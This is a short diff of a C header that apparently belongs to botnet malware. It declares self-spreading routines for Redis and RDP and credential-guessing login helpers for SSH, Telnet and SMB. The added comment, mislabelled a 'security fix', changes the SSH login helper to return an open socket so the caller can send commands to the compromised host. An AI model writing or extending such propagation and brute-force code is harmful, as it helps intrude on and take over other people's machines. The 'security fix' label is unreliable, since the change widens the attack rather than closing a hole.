@@ -48,6 +48,9 @@ int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port);
 int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port);
 
 /* ── Service Helpers ────────────────────────────────────────── */
+/* Returns socket fd on success (caller must close), -1 on failure.
+ * SECURITY FIX (#15): Changed from int success to int fd so the caller
+ * can send commands over the established connection. */
 int try_login_ssh(const char *ip, uint16_t port, const char *user, const char *pass);
 int try_login_telnet(const char *ip, uint16_t port, const char *user, const char *pass);
 int try_login_smb(const char *ip, uint16_t port, const char *user, const char *pass);
